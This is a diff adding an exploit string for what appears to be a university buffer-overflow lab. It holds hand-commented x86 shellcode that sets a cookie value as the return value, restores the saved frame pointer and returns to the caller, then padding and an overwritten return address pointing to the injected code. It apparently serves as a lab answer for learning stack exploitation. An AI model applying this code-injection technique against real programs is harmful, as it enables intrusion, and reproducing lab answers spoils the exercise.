@@ -1,0 +1,14 @@
+/* 40 Byte Buffer */
+b8 ae 2e 71 47 /* mov $0x47712eae(cookie for 2015011372), %eax(return value) */
+bd 80 35 68 55 /* mov $0x55683580(old %ebp for test()), %ebp */
+68 57 8c 04 08 /* push $0x8048c57(old %edi, test() call getbuf() next instruction) */
+c3 /* ret */
+/* above are buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* old %ebp */
+38 35 68 55 /* return address: line 1 instruction memory address */
